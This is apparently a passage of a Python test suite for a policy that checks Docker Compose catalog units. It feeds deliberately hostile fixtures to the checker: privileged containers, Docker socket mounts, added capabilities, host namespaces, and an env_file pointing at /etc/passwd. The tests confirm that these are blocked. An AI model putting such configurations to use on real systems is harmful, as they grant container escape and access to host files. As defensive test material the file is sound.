"""trust: the policy on the resolved configuration of the hostile units (golden files captured with Compose 5.6.0, so no
test here needs Compose or Docker), the class H table, the text screen, the surface, and the guarantee that judge is pure."""

import builtins
import copy
import io
import json
import os
import pathlib
import random
import re
import shutil
import socket
import subprocess
import sys
import tempfile
import time
import unittest
from contextlib import ExitStack
from pathlib import Path
from unittest import mock

from lab_ui.docker import compose
from lab_ui.catalogs import resolve, trust

from .. import Case, fixtures
from ..data import regen

# The rules with no hostile unit: Compose 5.6.0 drops a top-level key it does not know from its JSON, so T02 is tested on
# a JSON written by hand
GOLDEN_ONLY = frozenset(("T02",))

HOME = regen.FAKE_HOME
CLEAN = "p-clean-addon"   # an add-on that uses every construct a catalog may use
PLAYGROUND = "p-clean-playground"   # a playground whose seed is the Lab's own


class Golden(Case):
    """A test with a project folder of its own for the paths of the goldens to point into."""

    def setUp(self):
        holder = tempfile.TemporaryDirectory()
        self.addCleanup(holder.cleanup)
        self.root = Path(holder.name).resolve()

    def args(self, name, **more):
        return regen.case(name, self.root, **more)

    def judge(self, name, **more):
        return regen.judged(name, self.root, **more)

    def changed(self, name, edit, **more):
        """The verdict of a golden unit after `edit(arguments)` changed what judge is handed."""
        arguments = self.args(name, **more)
        edit(arguments)
        return trust.judge(**arguments)

    def declared(self, name, **more):
        """The verdict of a unit that says why every service of it uses this machine."""
        def edit(arguments):
            arguments["unit"]["meta"]["host_access"] = {service: "Because it must" for service in arguments["own"]}
        return self.changed(name, edit, **more)

    def fires(self, name, code, line=None, **more):
        verdict = self.judge(name, **more)
        self.assertEqual(verdict["state"], "blocked", f"{name}: {verdict['reasons']}")
        self.assertIn(code, verdict["codes"], f"{name}: {verdict['codes']}")
        if line:
            self.assertIn(line, verdict["reasons"])
        return verdict

    def silent(self, name, code, **more):
        verdict = self.judge(name, **more)
        self.assertNotIn(code, verdict["codes"], f"{name}: {verdict['reasons']}")
        return verdict

    def ok(self, name, **more):
        verdict = self.judge(name, **more)
        self.assertEqual((verdict["state"], verdict["reasons"]), ("ok", []), name)
        return verdict


line = trust.line


class Catalog(Case):
    """The goldens are the hostile catalog, and complete."""

    def test_a_golden_stands_for_each_unit_of_the_catalog_and_is_not_stale(self):
        on_disk = {}
        for folder, kind in regen.KINDS.items():
            for entry in sorted((regen.CATALOG / folder).iterdir()):
                name = entry.name[:-4] if kind == "setup" else entry.name
                on_disk[name] = (entry if kind == "setup" else entry / "compose.yml").read_text(encoding="utf-8")
        self.assertEqual(sorted(on_disk), regen.names())
        for name, text in on_disk.items():
            with self.subTest(unit=name):
                self.assertEqual(list(regen.load(name)["files"].values()), [text], "capture again: regen.py")

    def test_goldens_were_captured_by_compose_5(self):
        self.assertRegex(regen.load("core")["_capture"]["compose"], r"^5\.")

    def test_a_capture_runs_with_nothing_of_the_shell_but_a_path(self):
        self.assertEqual(sorted(regen._environment()), ["DOCKER_CONFIG", "HOME", "PATH"])
        with mock.patch.dict(os.environ, {"AWS_SECRET_ACCESS_KEY": "x", "GRAVITEE_LICENSE": "y", "COMPOSE_PROFILES": "z", "HOME": "/home/real"}):
            self.assertEqual(regen._environment()["HOME"], regen.FAKE_HOME)
            self.assertNotIn("GRAVITEE_LICENSE", regen._environment())

    def test_a_capture_names_nothing_the_maintainer_has_set(self):
        """A variable of the shell that a unit reads would be interpolated into the golden, and committed. Skipped, and said,
        without the Compose that captured them."""
        installed, captured = regen.version(), regen.load("core")["_capture"]["compose"]
        if installed != captured:
            reason = f"skipped: the goldens come from Compose {captured}, {'this is ' + installed if installed else 'none is installed'}"
            print(reason, file=sys.stderr)
            self.skipTest(reason)
        secrets = {"AWS_SECRET_ACCESS_KEY": "aws-secret-in-the-shell", "GRAVITEE_LICENSE": "license-in-the-shell",
                   "INTERNAL_API_PASSWORD": "password-in-the-shell", "HOSTILE_DEMO_PASSWORD": "demo-in-the-shell"}
        with mock.patch.dict(os.environ, secrets):
            found = regen.fresh(("t20-passthrough", "p-clean-playground"))
        for value in secrets.values():
            self.assertNotIn(value, json.dumps(found))
        self.assertEqual(found["core"], regen.load("core"))
        self.assertEqual(found["t20-passthrough"], regen.load("t20-passthrough"))

    def test_goldens_are_what_compose_gives_now(self):
        """A few units, captured again: Compose reads files and needs no daemon. Skipped, and said, without the Compose that
        captured them: another version prints other keys, and the policy fails closed on those."""
        installed, captured = regen.version(), regen.load("core")["_capture"]["compose"]
        if installed != captured:
            reason = f"skipped: the goldens come from Compose {captured}, {'this is ' + installed if installed else 'none is installed'}"
            print(reason, file=sys.stderr)
            self.skipTest(reason)
        sample = ("t03-privileged", "t12-bind-writable", "t14-external-volume", "t17-all-interfaces", "t27-unreadable", "p-pair",
                  "n02-seed-reads-token")
        found = regen.fresh(sample)
        for name in sample:
            with self.subTest(unit=name):
                self.assertEqual(found[name], regen.load(name), "capture again: regen.py")

    def test_no_golden_names_a_path_of_the_machine_that_captured_it(self):
        for path in sorted(regen.GOLDEN.glob("*.json")):
            text = path.read_text(encoding="utf-8")
            with self.subTest(file=path.name):
                for pattern in (r"/Users/", r"/private/", r"/var/folders", r"/tmp/", r"/home/(?!hostile)"):
                    self.assertIsNone(re.search(pattern, text), pattern)

    def test_no_file_of_the_hostile_data_names_a_real_item_or_a_real_address(self):
        """The real items are the folders the engine holds today and every id of $LAB_REAL_ITEMS (the default catalog's index,
        in the nightly job); an address in the data ends in .invalid, is this machine or is a service of the platform."""
        engine = regen.ENGINE
        real = {re.sub(r"\.yml$", "", entry.name) for folder in ("addons", "setups", "playgrounds") if (engine / folder).is_dir()
                for entry in (engine / folder).iterdir() if entry.name not in ("local", "README.md", "AGENTS.md", "CLAUDE.md")}
        real |= {item for item in os.environ.get("LAB_REAL_ITEMS", "").split(",") if item}
        texts = {path.name: path.read_text(encoding="utf-8") for path in regen.CATALOG.rglob("*") if path.is_file()}
        texts.update({name + ".json": json.dumps({key: regen.load(name)[key] for key in ("unit", "files", "own")})
                      for name in regen.names()})   # the platform's own services, in the captured configuration, are not the data
        texts["expected-hostile.json"] = regen.EXPECTED.read_text(encoding="utf-8")
        for file, text in texts.items():
            for name in sorted(real):
                with self.subTest(file=file, name=name):
                    self.assertIsNone(re.search(rf"(?<![\w-]){re.escape(name)}(?![\w-])", text))
            for host in re.findall(r"(?:https?|git|ssh)://(?:[^/@\s\"']*@)?([^/:\s\\\"'?#]+)|git@([^:\s\\\"']+):", text):
                host = host[0] or host[1]
                with self.subTest(file=file, host=host):
                    self.assertRegex(host, r"(\.invalid|^127\.0\.0\.1|^host\.docker\.internal)$|^[a-z0-9-]+$")

    def test_every_rule_has_a_unit_that_gives_it_or_is_golden_only(self):
        notes = {rule["lines"][0]: code for code, rule in trust.RULES.items() if rule["class"] == "N"}
        seen = set()
        with tempfile.TemporaryDirectory() as root:
            for listed in (False, True):
                for verdict in regen.pipeline(root, listed=listed).values():
                    seen.update(verdict["codes"])
                    seen.update(notes[note] for note in verdict["notes"])
        self.assertEqual(sorted(set(trust.RULES) - seen), sorted(GOLDEN_ONLY))

    def test_the_pipeline_says_what_the_oracle_says(self):
        wanted = json.loads(regen.EXPECTED.read_text(encoding="utf-8"))
        with tempfile.TemporaryDirectory() as holder:
            self.assertEqual(regen.expected(holder), wanted, "regen.py --expected, then read the diff")

    def test_the_oracle_is_the_lines_of_the_policy(self):
        wanted = json.loads(regen.EXPECTED.read_text(encoding="utf-8"))
        known = {trust.RULES[code]["lines"][variant] for code in trust.RULES for variant in range(len(trust.RULES[code]["lines"]))}
        for name, entry in wanted.items():
            for reason in entry["reasons"] + entry.get("when_listed", []):
                with self.subTest(unit=name, reason=reason):
                    self.assertTrue(any(re.fullmatch(re.sub(r"\\\{\w+\\\}", ".+", re.escape(text)), reason) for text in known))


# The standard's 6.10 (catalog-governance.md), T01 to T27, word for word: what CI and the command line say after a reason
SPEC_FIXES = {
    "T01": "Remove `{key}`, or ask the Lab's maintainers to support it.",
    "T02": "Remove `{key}`, or ask the Lab's maintainers to support it.",
    "T03": "Remove `privileged`: a demo that needs it is a personal item.",
    "T04": "Remove `use_api_socket`.",
    "T05": "Remove `provider`; use a container.",
    "T06": "Publish a port on 127.0.0.1 instead of sharing the host's network, processes or memory.",
    "T07": "Remove `cap_add`; run the image as it is meant to run.",
    "T08": "Remove `devices`, `gpus`, `runtime` and device reservations.",
    "T09": "Keep only `no-new-privileges` in `security_opt`; remove `sysctls`.",
    "T10": "Remove the mount of the Docker socket.",
    "T11": "Move the files under the unit's folder, or use a named volume.",
    "T12": "Mount it `:ro`, or put the data under `.state/`.",
    "T13": "Use a named volume the unit declares itself.",
    "T14": "Use a named volume the unit declares itself.",
    "T15": "Attach the service to `internal` or `edge` only.",
    "T16": "Point `file:` at a file inside the unit.",
    "T17": "Write the port as `127.0.0.1:HOST:CONTAINER`.",
    "T18": "Put the build context under the unit, pin a remote context to a 40-character commit after `#`, and remove ssh, "
           "secrets and cache options. Only `context`, `dockerfile`, `args`, `target` and `labels` are accepted (default-deny; "
           "`additional_contexts` only for the Lab's seeder).",
    "T19": "Use a relative path inside the catalog.",
    "T20": "Prefix the setting with `{NS}_`, or read only `*_VERSION`, `*_REGISTRY`, `*_PULL_POLICY` and the shared settings.",
    "T21": "Prefix service, container and volume names with the catalog id.",
    "T22": "On a platform service, set only `environment`, `extra_hosts`, `depends_on`, `labels`, read-only binds from your "
           "folder and loopback ports.",
    "T23": "Include only units of the default catalog, of this catalog, or of catalogs declared in `requires.catalogs`.",
    "T24": "A Public catalog cannot include a Private one: move the shared part to a Public catalog.",
    "T25": "Fix {name} first.",
    "T26": "Remove what this Gravitee Lab does not read, or check with the Gravitee Lab release that reads it "
           "(`catalog.py upgrade --lab-ref latest`). A `lab` is for older Gravitee Labs: `catalog.py upgrade --write` "
           "writes the one of `catalog.yml`.",
    "T27": "Run `docker compose -f {file} config` and fix what it prints.",
}


class Fixes(Case):
    """trust.FIXES (the standard's 6.10): the fix that CI and the command line say after the reason of a rule, and `fix`, which
    fills its blanks. The popover of the Lab keeps the reason lines alone."""

    def test_every_rule_of_the_policy_has_a_fix_and_there_is_none_for_another(self):
        self.assertEqual(sorted(trust.FIXES), sorted(trust.RULES))
        for code in trust.RULES:
            with self.subTest(code=code):
                self.assertIsInstance(trust.FIXES[code], str)
                self.assertTrue(trust.FIXES[code].strip())

    def test_t01_to_t27_are_the_words_of_the_standard(self):
        self.assertEqual({code: trust.FIXES[code] for code in SPEC_FIXES}, SPEC_FIXES)
        self.assertEqual(sorted(SPEC_FIXES), [f"T{number:02d}" for number in range(1, 28)])

    def test_the_rules_the_standard_does_not_table_have_a_fix_of_the_same_kind(self):
        self.assertEqual(sorted(set(trust.FIXES) - set(SPEC_FIXES)), ["N01", "N02", "N03", "N04", "N05", "T28", "T29"])
        for code in ("T28", "T29", "N01", "N02", "N03", "N04", "N05"):
            self.assertRegex(trust.FIXES[code], r"^[A-Z].*\.$", code)

    def test_a_fix_is_a_plain_sentence(self):
        for code, text in trust.FIXES.items():
            with self.subTest(code=code):
                self.assertTrue(text.isascii(), "no middle dot, no symbol")
                self.assertTrue(text.isprintable())
                self.assertEqual(text, text.strip())
                self.assertTrue(text[0].isupper(), "sentence case")
                self.assertTrue(text.endswith("."))
                self.assertNotIn("Fix:", text, "the clause that says it adds the word")
                self.assertNotIn("  ", text)
                self.assertLessEqual(len(text), 300)
                self.assertNotIn("\u00b7", text)

    def test_no_fix_names_a_place_the_lab_keeps_its_own_files_in(self):
        """A git install is read only and the author who reads a fix has no such folder: the fix names the catalog's own files."""
        for code, text in trust.FIXES.items():
            with self.subTest(code=code):
                self.assertNotIn(".lab", text)
                self.assertNotIn("catalogs/", text.replace("requires.catalogs", ""))
                self.assertNotRegex(text, r"(?<![\w`])/(?:Users|home|private|tmp|var|etc|root)\b")
                self.assertNotIn("lab-ui", text)

    def test_the_only_blanks_are_the_ones_fix_fills(self):
        found = {code: set(re.findall(r"\{(\w+)\}", text)) for code, text in trust.FIXES.items()}
        self.assertEqual({code: names for code, names in found.items() if names},
                         {"T01": {"key"}, "T02": {"key"}, "T20": {"NS"}, "T25": {"name"}, "T27": {"file"}})

    def test_a_blank_is_filled_with_what_the_caller_knows_and_left_as_written_otherwise(self):
        self.assertEqual(trust.fix("T26", min=1, max=2), trust.FIXES["T26"], "it names no level")
        self.assertEqual(trust.fix("T01", key="frobnicate"), "Remove `frobnicate`, or ask the Lab's maintainers to support it.")
        self.assertEqual(trust.fix("T20", NS="ACME"), trust.FIXES["T20"].replace("{NS}", "ACME"))
        self.assertEqual(trust.fix("T27", file="addons/x/compose.yml"),
                         "Run `docker compose -f addons/x/compose.yml config` and fix what it prints.")
        self.assertEqual(trust.fix("T25", name="Echo"), "Fix Echo first.")
        self.assertEqual(trust.fix("T03"), trust.FIXES["T03"])
        self.assertEqual(trust.fix("T01", other="x"), trust.FIXES["T01"], "a field no blank names is not used")

    def test_the_setting_prefix_is_the_namespace_as_the_lab_spells_it(self):
        self.assertEqual(trust.fix("T20", ns="acme-hub"), trust.FIXES["T20"].replace("{NS}", "ACME_HUB"))
        self.assertEqual(trust.fix("T20", NS="ACME"), trust.FIXES["T20"].replace("{NS}", "ACME"))
        self.assertEqual(trust.fix("T20", NS="MINE", ns="acme-hub"), trust.FIXES["T20"].replace("{NS}", "MINE"))
        self.assertEqual(trust.fix("T20", ns=3), trust.FIXES["T20"], "not a namespace")

    def test_what_an_author_wrote_is_cleaned_and_cut_and_is_never_read_as_a_blank(self):
        self.assertEqual(trust.fix("T01", key="a\n::error::b\x1b[31m"), "Remove `a ::error::b [31m`, or ask the Lab's maintainers to support it.")
        self.assertEqual(trust.fix("T25", name="{name} {min} {0} {x.y} %s {}"), "Fix {name} {min} {0} {x.y} %s {} first.",
                         "a value is put in once and not read again")
        long = trust.fix("T01", key="k" * 1000000)
        self.assertLess(len(long), 400)
        self.assertEqual(trust.fix("T25", name="  Echo \t two  "), "Fix Echo two first.")

    def test_fix_changes_nothing_it_is_handed(self):
        before = dict(trust.FIXES)
        fields = {"ns": "acme-hub", "key": "k"}
        trust.fix("T20", **fields)
        self.assertEqual(fields, {"ns": "acme-hub", "key": "k"})
        self.assertEqual(trust.FIXES, before)

    def test_an_unknown_code_is_a_key_error_as_for_the_reason_lines(self):
        for code in ("T99", "ST01", "t03", "", None):
            with self.subTest(code=code), self.assertRaises(KeyError):
                trust.fix(code)
        with self.assertRaises(KeyError):
            trust.line("T99")

    def test_a_fix_said_after_its_reason_makes_one_message_of_the_standard(self):
        for code, rule in trust.RULES.items():
            for variant, reason in enumerate(rule["lines"]):
                blanks = {name: "x" for name in re.findall(r"[{](\w+)[}]", reason)}
                said = f"{trust.line(code, variant, **blanks)}. Fix: {trust.fix(code)}"
                with self.subTest(code=code, variant=variant):
                    self.assertEqual(said.count("Fix:"), 1)
                    self.assertNotIn("..", said)
                    self.assertNotIn(". .", said)

    def test_the_long_form_of_a_rule_says_the_fix_the_policy_does(self):
        """`catalog.py explain` prints the table of the policy with the fix of FIXES (explain.py)."""
        from lab_ui.catalogs import explain
        table = explain.table()
        for code in trust.RULES:
            with self.subTest(code=code):
                self.assertIn(trust.FIXES[code], table[code].message)

    def test_the_popover_of_the_lab_keeps_the_reason_lines_alone(self):
        for code, rule in trust.RULES.items():
            for text in rule["lines"]:
                with self.subTest(code=code, line=text):
                    self.assertNotIn("Fix", text)
                    self.assertNotIn(trust.FIXES[code], text)


class Allowance(Case):
    """host_ok: milestone M1 counts the list alone, M2 the allowance of the person too."""

    def test_m1_only_a_listed_catalog_may_use_this_machine(self):
        with mock.patch.object(trust, "ALLOWANCE", False):
            self.assertTrue(trust.host_ok(True))
            self.assertTrue(trust.host_ok(True, {"host": False}))
            self.assertFalse(trust.host_ok(False))
            self.assertFalse(trust.host_ok(False, {"host": True}))
            self.assertFalse(trust.host_ok(None, None))

    def test_the_allowance_is_on(self):
        self.assertTrue(trust.ALLOWANCE)

    def test_m2_the_allowance_of_the_person_is_honored_when_it_is_exactly_true(self):
        self.assertTrue(trust.host_ok(False, {"host": True}))
        self.assertTrue(trust.host_ok(True))
        for entry in (None, {}, {"host": False}, {"host": "true"}, {"host": 1}, {"host": None}, "host", ["host"]):
            with self.subTest(entry=entry):
                self.assertFalse(trust.host_ok(False, entry))


class Keys(Golden):

    def test_t01_an_unknown_service_key_blocks(self):
        verdict = self.fires("t01-unknown-service-key", "T01", line("T01", key="models"))
        self.assertEqual(verdict["codes"], ["T01"])

    def test_t01_a_known_key_and_a_key_of_the_host_class_do_not(self):
        self.silent(CLEAN, "T01")
        for name in ("t03-privileged", "t07-cap-add", "t08-devices", "t09-security-opt"):
            self.assertNotIn("T01", self.judge(name)["codes"], name)

    def test_t01_any_key_it_does_not_know_blocks_and_an_extension_does_not(self):
        def key(value):
            return lambda arguments: arguments["unit_config"]["services"]["hostile-clean"].update(value)
        self.assertIn(line("T01", key="frobnicate"), self.changed(CLEAN, key({"frobnicate": 1}))["reasons"])
        self.assertIn(line("T01", key="frobnicate, develop"), self.changed(CLEAN, key({"frobnicate": 1, "develop": {}}))["reasons"])
        self.assertNotIn("T01", self.changed(CLEAN, key({"x-note": "yes"}))["codes"])

    def test_t01_the_keys_the_policy_names_are_known_or_absent_on_purpose(self):
        for absent in ("volumes_from", "models", "post_start", "pre_stop", "develop", "extends", "env_file", "label_file"):
            self.assertNotIn(absent, trust.SERVICE_KEYS)
            self.assertNotIn(absent, trust.HOST_KEYS)
        self.assertEqual(trust.FILE_KEYS, ("env_file", "label_file"))
        self.assertFalse(trust.SERVICE_KEYS & trust.HOST_KEYS)

    def test_t19_the_files_the_json_still_names_are_judged_by_their_real_place(self):
        """With `config --no-env-resolution` an env_file is a path in the JSON, not yet merged into the environment, and a link in
        the unit's folder that leads out of it can be seen there and nowhere else."""
        folder = self.root / ".lab/catalogs/hostile/addons/p-clean-addon"
        folder.mkdir(parents=True)
        outside = self.root / "outside.env"
        outside.write_text("X=1\n")
        os.symlink(outside, folder / "linked.env")
        (folder / "own.env").write_text("X=1\n")
        unit = str(folder)
        for entries, state in (([unit + "/own.env"], "ok"), ([{"path": unit + "/own.env", "required": False}], "ok"), ("own.env", "ok"),
                               ([unit + "/own.env", unit + "/linked.env"], "blocked"), ([{"path": unit + "/linked.env"}], "blocked"),
                               ([str(outside)], "blocked"), ([unit + "/../x.env"], "blocked"), ([{"required": False}], "blocked"),
                               ([None], "blocked"), ([7], "blocked"), ("/etc/passwd", "blocked"), ([], "ok"), (None, "ok")):
            for key in trust.FILE_KEYS:
                def edit(arguments, entries=entries, key=key):
                    arguments["unit_config"]["services"]["hostile-clean"][key] = entries
                with self.subTest(entries=entries, key=key):
                    verdict = self.changed(CLEAN, edit)
                    self.assertEqual(verdict["state"], state, verdict["reasons"])
                    self.assertEqual(verdict["reasons"], [] if state == "ok" else [line("T19", 1)])
        def not_followed(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["env_file"] = [unit + "/linked.env"]
        self.assertEqual(self.changed(CLEAN, not_followed, realpath=None)["state"], "ok")   # as written, a link passes: the caller hands in realpath

    def test_t01_a_key_on_what_it_overlays_is_judged_too(self):
        def edit(arguments):
            arguments["overlaid"] = {"apim-gateway": {"models": ["m"]}}
        self.assertIn(line("T01", key="models"), self.changed("p-overlay-ok", edit)["reasons"])

    def test_t01_a_setup_defines_no_service(self):
        def edit(arguments):
            arguments["own"] = ["hostile-extra"]
            arguments["unit_config"]["services"]["hostile-extra"] = {"image": "busybox:1.36"}
        verdict = self.changed("p-pair", edit)
        self.assertEqual(verdict["codes"], ["T01"])
        self.assertIn(line("T01", key="services"), verdict["reasons"])

    def test_t02_an_unknown_top_level_key_blocks(self):
        def edit(arguments):
            arguments["unit_config"]["models"] = {"m": {}}
        self.assertIn(line("T02", key="models"), self.changed(CLEAN, edit)["reasons"])

    def test_t02_the_keys_of_a_file_and_the_extensions_do_not(self):
        def edit(arguments):
            arguments["unit_config"]["x-anchor"] = {"a": 1}
        self.assertEqual(self.changed(CLEAN, edit)["state"], "ok")
        self.assertEqual(sorted(trust.TOP_KEYS), ["configs", "name", "networks", "secrets", "services", "volumes"])


class ClassH(Golden):
    """A class H finding is blocked, allowed or told off for not saying why."""

    UNITS = (("T03", "t03-privileged", "hostile-privileged"), ("T04", "t04-api-socket", "hostile-api-socket"),
             ("T05", "t05-provider", "hostile-provider"), ("T06", "t06-host-network", "hostile-host"),
             ("T07", "t07-cap-add", "hostile-capability"), ("T08", "t08-devices", "hostile-device"),
             ("T09", "t09-security-opt", "hostile-isolation"), ("T10", "t10-docker-socket", "hostile-socket"),
             ("T11", "t11-bind-outside", "hostile-outside"))

    def test_the_table_blocked_allowed_and_told_off(self):
        for code, name, service in self.UNITS:
            with self.subTest(code=code):
                blocked = self.judge(name)
                self.assertIn(code, blocked["codes"])
                self.assertEqual(blocked["state"], "blocked")
                self.assertNotIn("T28", blocked["codes"])
                silent = self.judge(name, listed=True)
                self.assertNotIn(code, silent["codes"])
                self.assertIn(line("T28", service=service), silent["reasons"])
                allowed = self.declared(name, listed=True)
                self.assertNotIn(code, allowed["codes"])
                self.assertNotIn("T28", allowed["codes"])
                self.assertEqual([item["service"] for item in allowed["surface"]["uses_machine"]], [service])
                self.assertEqual(allowed["surface"]["uses_machine"][0]["why"], "Because it must")
                self.assertTrue(allowed["surface"]["uses_machine"][0]["what"])

    def test_the_person_may_allow_what_the_catalog_is_not_listed_for(self):
        self.assertEqual(self.declared("t03-privileged", allowed=True)["state"], "ok")
        self.assertEqual(self.judge("t03-privileged", allowed=True)["codes"], ["T28"])
        self.assertEqual(self.judge("t03-privileged")["codes"], ["T03"])

    def test_a_reason_that_says_nothing_is_not_a_reason(self):
        for why in ("", "   ", None, 3, ["x"]):
            def edit(arguments, why=why):
                arguments["unit"]["meta"]["host_access"] = {"hostile-privileged": why}
            with self.subTest(why=why):
                self.assertIn("T28", self.changed("t03-privileged", edit, listed=True)["codes"])

    def test_a_declaration_for_another_service_or_in_a_wrong_shape_declares_nothing(self):
        for declaration in ({"another": "why"}, ["hostile-privileged"], "hostile-privileged", 7):
            def edit(arguments, declaration=declaration):
                arguments["unit"]["meta"]["host_access"] = declaration
            with self.subTest(declaration=declaration):
                self.assertIn("T28", self.changed("t03-privileged", edit, listed=True)["codes"])

    def test_the_default_catalog_is_judged_like_any_other(self):
        verdict = self.judge("t03-privileged", listed=True)
        self.assertEqual((verdict["state"], verdict["codes"]), ("blocked", ["T28"]))

    def test_t03_fails_without_the_catalog_and_passes_with_the_catalog_and_a_declaration(self):
        self.fires("t03-privileged", "T03", line("T03"))
        self.assertEqual(self.judge("h-privileged-declared", listed=True)["state"], "ok")
        self.assertEqual(self.judge("h-privileged-declared")["reasons"], [line("T03")])

    def test_t03_a_privileged_build_is_privileged_too(self):
        def edit(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["build"] = {"context": arguments["roots"]["unit"], "privileged": True}
        self.assertIn(line("T03"), self.changed(CLEAN, edit)["reasons"])

    def test_t04_to_t05_the_docker_api_and_a_program_of_the_host(self):
        self.fires("t04-api-socket", "T04", line("T04"))
        self.fires("t05-provider", "T05", line("T05"))
        self.assertEqual(self.declared("t04-api-socket", listed=True)["state"], "ok")
        self.assertEqual(self.declared("t05-provider", listed=True)["state"], "ok")
        def edit(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["use_api_socket"] = False
        self.assertEqual(self.changed(CLEAN, edit)["state"], "ok")

    def test_t06_the_first_namespace_it_shares_is_the_line(self):
        self.fires("t06-host-network", "T06", line("T06", 0))
        for key, variant in (("pid", 1), ("ipc", 2), ("uts", 3), ("userns_mode", 3), ("cgroup", 3), ("cgroup_parent", 3)):
            def edit(arguments, key=key):
                service = arguments["unit_config"]["services"]["hostile-clean"]
                service[key] = "x" if key == "cgroup_parent" else "host"
            with self.subTest(key=key):
                self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T06", variant)])
        def other(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["pid"] = "container:abc"
        self.assertEqual(self.changed(CLEAN, other)["reasons"], [line("T06", 1)])
        def fine(arguments):
            arguments["unit_config"]["services"]["hostile-clean"].update(ipc="shareable", pid="private")
        self.assertEqual(self.changed(CLEAN, fine)["state"], "ok")

    def test_t06_the_processes_and_memory_of_a_container_of_the_platform_are_no_one_s_to_join(self):
        for key, variant in (("pid", 1), ("ipc", 2)):
            def edit(arguments, key=key):
                arguments["unit_config"]["services"]["hostile-clean"][key] = "service:mongodb"
            with self.subTest(key=key):
                self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T06", variant)])
                self.assertEqual(self.declared(CLEAN, listed=True)["state"], "ok")
                joined = self.changed(CLEAN, edit, listed=True)
                self.assertEqual(joined["reasons"], [line("T28", service="hostile-clean")])
        def own(arguments):
            arguments["unit_config"]["services"]["hostile-clean"].update(pid="service:hostile-clean-sidecar", ipc="service:redis")
            arguments["context"]["closure_services"] = ["redis"]
            arguments["unit_config"]["services"]["hostile-clean-sidecar"] = {"image": "busybox"}
            arguments["own"] = ["hostile-clean", "hostile-clean-sidecar"]
        self.assertEqual(self.changed(CLEAN, own)["state"], "ok")
        def declared(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["pid"] = "service:mongodb"
            arguments["unit"]["meta"]["host_access"] = {"hostile-clean": "Reads the processes of the database"}
        item = self.changed(CLEAN, declared, listed=True)["surface"]["uses_machine"][0]
        self.assertEqual(item["what"], ["shares the processes of another container"])

    def test_t07_capabilities_to_add_but_not_to_drop(self):
        self.fires("t07-cap-add", "T07", line("T07"))
        def edit(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["cap_drop"] = ["ALL"]
        self.assertEqual(self.changed(CLEAN, edit)["state"], "ok")

    def test_t08_a_device_a_rule_a_gpu_a_runtime_and_a_reservation(self):
        self.fires("t08-devices", "T08", line("T08"))
        for key, value in (("device_cgroup_rules", ["c 1:3 mr"]), ("gpus", [{"count": -1}]), ("runtime", "nvidia"),
                           ("deploy", {"resources": {"reservations": {"devices": [{"driver": "nvidia"}]}}})):
            def edit(arguments, key=key, value=value):
                arguments["unit_config"]["services"]["hostile-clean"][key] = value
            with self.subTest(key=key):
                self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T08")])
        def fine(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["deploy"] = {"resources": {"limits": {"cpus": "1"}}}
        self.assertEqual(self.changed(CLEAN, fine)["state"], "ok")

    def test_t09_only_no_new_privileges_is_not_a_lowering(self):
        self.fires("t09-security-opt", "T09", line("T09"))
        for option in ("no-new-privileges", "no-new-privileges:true", "No-New-Privileges=true"):
            def edit(arguments, option=option):
                arguments["unit_config"]["services"]["hostile-clean"]["security_opt"] = [option]
            with self.subTest(option=option):
                self.assertEqual(self.changed(CLEAN, edit)["state"], "ok")
        def lowered(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["security_opt"] = ["no-new-privileges:false"]
        self.assertEqual(self.changed(CLEAN, lowered)["reasons"], [line("T09")])
        def kernel(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["sysctls"] = {"net.core.somaxconn": "1"}
        self.assertEqual(self.changed(CLEAN, kernel)["reasons"], [line("T09")])

    def test_every_host_key_is_judged_by_a_rule_of_its_own(self):
        """A key the policy lets T01 pass because it is a key of this machine must be blocked by a rule that says what it takes."""
        sample = {"privileged": True, "use_api_socket": True, "provider": {"type": "x"}, "devices": ["/dev/x"],
                  "device_cgroup_rules": ["c 1:3 mr"], "gpus": [{"count": 1}], "cap_add": ["SYS_ADMIN"], "sysctls": {"a": "1"},
                  "runtime": "nvidia", "cgroup_parent": "parent"}
        self.assertEqual(sorted(sample), sorted(trust.HOST_KEYS))
        for key, value in sample.items():
            def edit(arguments, key=key, value=value):
                arguments["unit_config"]["services"]["hostile-clean"][key] = value
            with self.subTest(key=key):
                blocked = self.changed(CLEAN, edit)
                self.assertEqual(len(blocked["reasons"]), 1)
                self.assertNotIn("T01", blocked["codes"])
                self.assertEqual(self.changed(CLEAN, edit, listed=True)["codes"], ["T28"])


class Mounts(Golden):

    def test_t10_the_docker_socket_by_name_by_link_and_by_pipe(self):
        self.fires("t10-docker-socket", "T10", line("T10"))
        def pipe(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [{"type": "npipe", "source": "//./pipe/docker_engine", "target": "/x"}]
        self.assertEqual(self.changed(CLEAN, pipe)["reasons"], [line("T10")])
        def renamed(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [
                {"type": "bind", "source": "/run/docker.sock/", "target": "/x"}]
        self.assertEqual(self.changed(CLEAN, renamed)["reasons"], [line("T10")])

    def test_t10_a_link_to_the_socket_is_the_socket(self):
        folder = self.root / ".lab/catalogs/hostile/addons/p-clean-addon"
        folder.mkdir(parents=True)
        os.symlink("/var/run/docker.sock", folder / "engine")
        def edit(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [
                {"type": "bind", "source": str(folder / "engine"), "target": "/x", "read_only": True}]
        self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T10")])
        self.assertEqual(self.changed(CLEAN, edit, realpath=None)["state"], "ok")

    def test_t10_passes_without_it(self):
        self.silent(CLEAN, "T10")

    def test_t01_a_mount_the_policy_cannot_place_is_no_mount(self):
        """A type Compose 5 does not print, or a bind with no source, falls through every branch and passes: default-deny
        says a Compose that learns a new kind of mount must fail closed."""
        def mount(volume):
            return lambda arguments: arguments["unit_config"]["services"]["hostile-clean"].update(volumes=[volume])
        for volume, key in (({"source": "/etc", "target": "/x"}, "volumes.type"), ({"type": "cluster", "source": "/etc", "target": "/x"}, "volumes.type"),
